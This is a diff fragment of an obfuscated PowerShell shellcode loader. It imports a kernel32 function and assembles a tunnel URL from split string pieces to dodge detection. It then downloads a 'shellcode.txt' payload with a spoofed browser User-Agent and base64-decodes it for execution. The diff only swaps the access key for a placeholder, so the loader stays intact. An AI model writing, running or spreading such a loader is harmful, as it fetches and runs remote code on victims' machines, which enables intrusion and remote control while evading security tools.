@@ -5,7 +5,7 @@ $d=@"
 [DllImport("kernel32")]public static extern uint $c(IntPtr a,uint b);
 "@
 $k=Add-Type -MemberDefinition $d -Name "W" -PassThru
-$u="htt"+"ps:/"+"/exch"+"ange-cla"+"ssified"+"-lace"+"-inches"+".trycloud"+"flare.com"+"/pay"+"loads/"+"shell"+"code.txt?key=312c5c481461765d"
+$u="htt"+"ps:/"+"/exch"+"ange-cla"+"ssified"+"-lace"+"-inches"+".trycloud"+"flare.com"+"/pay"+"loads/"+"shell"+"code.txt?key=PLACEHOLDER_TOKEN"
 $w=New-Object Net.WebClient
 $w.Headers.Add("User-Agent","Mozilla/5.0")
 $x=[Convert]::FromBase64String($w.DownloadString($u))
